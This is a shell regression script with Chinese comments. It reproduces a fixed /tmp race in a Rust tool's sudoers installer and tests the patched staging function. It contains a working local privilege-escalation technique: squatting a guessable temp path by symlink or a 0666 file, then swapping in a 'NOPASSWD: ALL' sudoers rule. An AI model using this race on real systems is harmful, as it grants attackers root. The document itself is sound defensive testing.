#!/bin/sh
# T43 复现：`zloop install --sudoers` 把规则先写到一个**别人也能占名**的路径，再让
# `sudo install` 从**同一条路径**重新读一遍装进 /etc/sudoers.d/。两次读之间别人换掉内容，
# 装进去的就是他那一份——一条 `NOPASSWD: ALL` 就是 root。
#
# 修之前（src/awake.rs）：
#     let tmp = env::temp_dir().join(format!("zloop-pmset.{}", process::id()));  // 名字可猜
#     fs::write(&tmp, &rule)?;                                                    // 无 O_EXCL / O_NOFOLLOW
#     visudo -c -f $tmp                                                           // 语法检查（攻击者的规则照样过）
#     sudo install -o root -g wheel -m 0440 $tmp /etc/sudoers.d/zloop-pmset       // 从路径重新读
#
# 前提（两条都要成立，缺一不可，所以定级 P2 而不是 P0）：
#   1. `TMPDIR` 指向一个别的 uid 也写得进的目录。macOS **默认不是**这样：TMPDIR 没设时
#      Rust 的 env::temp_dir() 走 confstr(_CS_DARWIN_USER_TEMP_DIR)，拿到的是每用户
#      0700 的 /var/folders/…/T/（实测见 docs/CODE-AUDIT.md §19）。要中招得自己
#      `export TMPDIR=/tmp`（/tmp 是 1777，为绕开 /var/folders 长路径的常见手工设置）。
#   2. 机器上有第二个非 root uid 在跑代码（另一个登录用户，或被拿下的 _www / nobody 之类服务账号）。
#
# 这个脚本把 (2) 用同一个 uid 演一遍——**代码对属主一个字都没检查**，所以这一步是等价的；
# (1) 用 TMPDIR=/tmp 如实打开。两种占名方式都跑：软链接、和攻击者自己的 0666 普通文件。
#
#   sh scripts/repro-t43-sudoers-tmp-swap.sh
#
# 第一部分把修之前那三行**照抄一遍**跑给人看（它永远会中招，那就是这条 issue 本身）；
# 退出码由第二部分决定——同一手占名打在仓库里现在这个 `awake::stage_rule_in` 上：
# 0 = 挡住了，1 = 又漏了（回归），2 = 没能测到（编译/链接不上）。
#
# 环境变量：CARGO=<cargo 路径>
set -u
ROOT=$(git -C "$(dirname "$0")" rev-parse --show-toplevel 2>/dev/null || echo .)
CARGO=${CARGO:-cargo}

W=$(mktemp -d "/tmp/zloop-t43.XXXXXX") || exit 2
mkdir -p "$W/attacker" "$W/dest" || exit 2
PAYLOAD="$W/attacker/payload"
BAD="# zloop: 攻击者的规则
attacker ALL=(root) NOPASSWD: ALL
"
printf '%s' "$BAD" > "$PAYLOAD"

# ---------------------------------------------------------------- 第一部分：修之前
# 复刻修之前的三步（唯一改动：`sudo install -o root -g wheel` → 不带 sudo 的 `install`，
# 目的地换成 $W/dest。攻击面——「源路径由谁控制」——一模一样）。
cat > "$W/victim.rs" <<'EOF'
use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::process::Command;

fn main() {
    let a: Vec<String> = std::env::args().collect();
    let (precreate, swap, dst) = (&a[1], &a[2], &a[3]);
    let rule = "# zloop: 真规则\nvictim ALL=(root) NOPASSWD: /usr/bin/pmset -a disablesleep 1\n";
    let tmp = std::env::temp_dir().join(format!("zloop-pmset.{}", std::process::id()));
    println!("  源路径 = {}   ← temp_dir + pid，猜得到", tmp.display());

    // ① 攻击者在 write 之前就占住这个名字（现实里靠 pid farm，或 ps 盯着 pid 计数器）
    Command::new("sh").arg("-c").arg(precreate).env("TMPPATH", &tmp).status().unwrap();

    // ② install_sudoers 的 fs::write：不 O_EXCL，也不 O_NOFOLLOW
    fs::write(&tmp, rule).unwrap();
    println!("  fs::write 之后 mode = {:04o}（属主/权限位都还是他挑的）", fs::metadata(&tmp).unwrap().permissions().mode() & 0o7777);
    println!("  真正落地的实体 = {}", fs::canonicalize(&tmp).unwrap().display());

    // ③ 窗口：write 与 install 之间。真代码里还夹着 visudo -c 和一次**交互式密码输入**——
    //    人在键盘前想多久，这个窗口就有多久。
    Command::new("sh").arg("-c").arg(swap).env("TMPPATH", &tmp).status().unwrap();

    // ④ install 从**路径**重新读一次
    let st = Command::new("install").args(["-m", "0440"]).arg(&tmp).arg(dst).status().unwrap();
    println!("  install 退出码 = {:?}", st.code());
    let _ = fs::remove_file(&tmp); // 修之前也会删，删掉的是软链接本身，target 完好
}
EOF
rustc -O -o "$W/victim" "$W/victim.rs" 2>/dev/null || { echo "rustc 编译不了 victim.rs"; exit 2; }

SWAPPED=0
echo "=== 修之前 · 占名方式 A：软链接指到攻击者的文件 ==="
TMPDIR=/tmp "$W/victim" \
  'ln -sfn '"$PAYLOAD"' "$TMPPATH"' \
  'printf "%s" "'"$BAD"'" > '"$PAYLOAD" \
  "$W/dest/a"
echo "  → 装进 sudoers.d 的是："
sed 's/^/      /' "$W/dest/a"
grep -q 'NOPASSWD: ALL' "$W/dest/a" && SWAPPED=1

echo
echo "=== 修之前 · 占名方式 B：攻击者自己的 0666 普通文件（连软链接都不用） ==="
TMPDIR=/tmp "$W/victim" \
  'printf "x\n" > "$TMPPATH"; chmod 666 "$TMPPATH"' \
  'printf "%s" "'"$BAD"'" > "$TMPPATH"' \
  "$W/dest/b"
echo "  → 装进 sudoers.d 的是："
sed 's/^/      /' "$W/dest/b"
grep -q 'NOPASSWD: ALL' "$W/dest/b" && SWAPPED=1

echo
echo "  （visudo -c 拦不住：攻击者的规则语法完全合法）"
printf '%s' "$BAD" | sed "s/^attacker/$(id -un)/" > "$W/attacker/probe"
visudo -c -f "$W/attacker/probe" 2>&1 | sed 's/^/      /'

# ---------------------------------------------------------------- 第二部分：修之后
# 直接调**仓库里现在这个** awake::stage_rule_in（不是抄一份），链 target/debug 的 rlib。
echo
echo "=== 修之后：同一手占名，打在现在的 awake::stage_rule_in 上 ==="
[ "$SWAPPED" = 1 ] || echo "  （注意：第一部分一次都没中，可那几行是照抄的老代码，本该必中——脚本自己坏了）"
"$CARGO" build --quiet 2>/dev/null || { echo "  cargo build 失败，测不到现在的代码"; exit 2; }
RLIB=$(ls -t "$ROOT"/target/debug/libzloop.rlib 2>/dev/null | head -1)
cat > "$W/fixed.rs" <<'EOF'
use std::fs;
use std::os::unix::fs::PermissionsExt;
fn main() {
    let base = std::path::PathBuf::from(std::env::args().nth(1).unwrap());
    // 攻击者按老代码那个可猜的名字提前占位
    let decoy = base.join(format!("zloop-pmset.{}", std::process::id()));
    fs::write(&decoy, "# 攻击者占的位\n").unwrap();
    let s = zloop::awake::stage_rule_in(&base, "# zloop: 真规则\n").unwrap();
    println!("  暂存到 = {}", s.file().display());
    println!("  目录 mode = {:04o}（要的是 0700：只有自己进得去）", fs::symlink_metadata(s.dir()).unwrap().permissions().mode() & 0o7777);
    println!("  文件 mode = {:04o}", fs::symlink_metadata(s.file()).unwrap().permissions().mode() & 0o7777);
    println!("  占位的那个文件现在是：{}", fs::read_to_string(&decoy).unwrap().trim_end());
    assert_eq!(fs::read_to_string(&decoy).unwrap(), "# 攻击者占的位\n", "占住的名字被我们接手了");
    assert_eq!(fs::read_to_string(s.file()).unwrap(), "# zloop: 真规则\n");
    let (d, f) = (s.dir().to_path_buf(), s.file().to_path_buf());
    drop(s);
    assert!(!d.exists() && !f.exists(), "暂存的东西没清掉");
    let _ = fs::remove_file(&decoy);
    println!("  暂存目录用完即清：{}", !d.exists());
}
EOF
rustc --edition 2021 -L "$ROOT/target/debug/deps" --extern zloop="$RLIB" \
      -o "$W/fixed" "$W/fixed.rs" 2>"$W/rustc.err" \
  || { echo "  链不上 rlib，测不到现在的代码；rustc 说：$(head -1 "$W/rustc.err")"; exit 2; }

echo
if TMPDIR=/tmp "$W/fixed" /tmp; then
  echo
  echo "[OK] 同一手占名对现在的代码不起作用：规则落在一个刚 mkdir 出来的 0700 私有目录里"
  echo "     （第一部分那两下是照抄的老代码，留着是为了让人看见这条 issue 长什么样）"
  exit 0
fi
echo
echo "[FAIL] 回归了：别人占住名字之后，stage_rule_in 又跟着写了。工作目录：$W"
exit 1
